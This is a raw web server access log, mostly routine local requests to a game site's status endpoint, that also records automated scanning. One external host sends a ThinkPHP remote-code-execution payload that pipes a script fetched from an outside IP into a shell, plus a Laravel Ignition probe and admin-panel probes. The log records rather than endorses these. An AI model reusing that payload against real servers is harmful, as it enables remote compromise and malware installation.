127.0.0.1 - - [13/Mar/2021:03:10:46 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:11:29 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
74.120.14.56 - - [13/Mar/2021:03:12:12 +0100] "GET / HTTP/1.1" 302 - "-" "-"
74.120.14.56 - - [13/Mar/2021:03:12:12 +0100] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
74.120.14.56 - - [13/Mar/2021:03:12:12 +0100] "GET /wow/ HTTP/1.1" 200 29815 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
127.0.0.1 - - [13/Mar/2021:03:12:14 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:12:36 +0100] "GET /building-tools/ HTTP/1.1" 403 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:12:36 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:12:45 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:13:43 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:14:26 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:15:09 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:15:47 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:16:34 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:17:12 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:17:33 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:18:05 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:18:28 +0100] "GET /building-tools/ HTTP/1.1" 200 112 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:18:28 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:18:29 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:19:09 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:19:43 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:20:25 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:20:55 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
103.249.98.65 - - [13/Mar/2021:03:21:11 +0100] "GET /login HTTP/1.0" 302 - "-" "-"
103.249.98.65 - - [13/Mar/2021:03:21:11 +0100] "GET /jenkins/login HTTP/1.0" 302 - "-" "-"
103.249.98.65 - 8hYTSUFk [13/Mar/2021:03:21:11 +0100] "GET /manager/html HTTP/1.1" 302 - "-" "Go-http-client/1.1"
103.249.98.65 - - [13/Mar/2021:03:21:12 +0100] "GET /wow/ HTTP/1.1" 200 30052 "http://91.66.92.29:80/manager/html" "Go-http-client/1.1"
103.249.98.65 - - [13/Mar/2021:03:21:13 +0100] "GET /wp-login.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
103.249.98.65 - - [13/Mar/2021:03:21:13 +0100] "GET /wow/ HTTP/1.1" 200 30052 "http://91.66.92.29:80/wp-login.php" "Go-http-client/1.1"
103.249.98.65 - - [13/Mar/2021:03:21:14 +0100] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
103.249.98.65 - - [13/Mar/2021:03:21:14 +0100] "GET /wow/ HTTP/1.1" 200 30052 "http://91.66.92.29:80" "Go-http-client/1.1"
103.249.98.65 - - [13/Mar/2021:03:21:16 +0100] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://31.210.20.181/ldr.sh|sh HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
103.249.98.65 - - [13/Mar/2021:03:21:16 +0100] "GET /wow/ HTTP/1.1" 200 30052 "http://91.66.92.29:80/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://31.210.20.181/ldr.sh|sh" "Go-http-client/1.1"
103.249.98.65 - - [13/Mar/2021:03:21:17 +0100] "POST /_ignition/execute-solution HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
103.249.98.65 - - [13/Mar/2021:03:21:17 +0100] "GET /wow/ HTTP/1.1" 200 30052 "http://91.66.92.29:80/_ignition/execute-solution" "Go-http-client/1.1"
127.0.0.1 - - [13/Mar/2021:03:21:34 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:22:17 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:23:19 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:23:55 +0100] "GET /building-tools/ HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:24:06 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:24:46 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:25:25 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:25:30 +0100] "GET /building-tools/ HTTP/1.1" 200 557 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:26:07 +0100] "GET /building-tools/ HTTP/1.1" 200 681 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:26:07 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:26:08 +0100] "GET /building-tools/ HTTP/1.1" 304 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:26:15 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:26:40 +0100] "GET /building-tools/ HTTP/1.1" 200 681 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:27:13 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:27:45 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:27:57 +0100] "GET /building-tools/ HTTP/1.1" 200 681 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:27:57 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:27:59 +0100] "GET /building-tools/boost.php HTTP/1.1" 200 168 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:28:35 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:28:56 +0100] "GET /building-tools/boost.php HTTP/1.1" 500 - "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:29:21 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:29:34 +0100] "GET /building-tools/boost.php HTTP/1.1" 500 - "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:29:35 +0100] "GET /building-tools/boost.php HTTP/1.1" 500 - "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:29:58 +0100] "GET /building-tools/boost.php HTTP/1.1" 200 168 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:30:00 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:30:01 +0100] "GET /building-tools/cmake.php HTTP/1.1" 200 1266 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:30:06 +0100] "GET /building-tools/mysql.php HTTP/1.1" 200 660 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:30:06 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:30:52 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:31:06 +0100] "GET /building-tools/boost.php HTTP/1.1" 200 452 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:31:35 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:32:11 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1294 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:32:32 +0100] "GET /building-tools/boost.php HTTP/1.1" 200 452 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:32:33 +0100] "GET /building-tools/boost.php HTTP/1.1" 200 452 "http://192.168.178.55/building-tools/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
192.168.178.3 - - [13/Mar/2021:03:32:33 +0100] "GET /favicon.ico HTTP/1.1" 200 260062 "http://192.168.178.55/building-tools/boost.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:32:49 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:33:48 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1276 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:34:40 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1277 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:35:07 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:35:49 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:36:19 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:37:05 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1293 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:37:45 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:38:45 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:39:18 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:39:44 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1290 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:40:09 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:40:50 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1290 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
205.185.127.244 - - [13/Mar/2021:03:41:22 +0100] "GET /config/getuser?index=0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
116.162.56.6 - - [13/Mar/2021:03:41:28 +0100] "GET /index.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
116.162.56.6 - - [13/Mar/2021:03:41:29 +0100] "GET /phpmyadmin/index.php HTTP/1.1" 403 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
127.0.0.1 - - [13/Mar/2021:03:41:38 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:42:27 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:43:19 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:44:11 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:45:02 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:46:15 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:47:11 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:48:00 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:48:35 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:49:27 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
185.252.146.112 - - [13/Mar/2021:03:50:16 +0100] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
185.252.146.112 - - [13/Mar/2021:03:50:17 +0100] "GET /wow/ HTTP/1.1" 200 29815 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
127.0.0.1 - - [13/Mar/2021:03:50:36 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:51:14 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:51:51 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:52:28 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:53:20 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:54:22 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:54:47 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:55:33 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:56:23 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:57:05 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:57:43 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:58:29 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:03:59:07 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:00:00 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:00:37 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:01:07 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:01:59 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:02:53 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:03:45 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1291 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
127.0.0.1 - - [13/Mar/2021:04:04:23 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
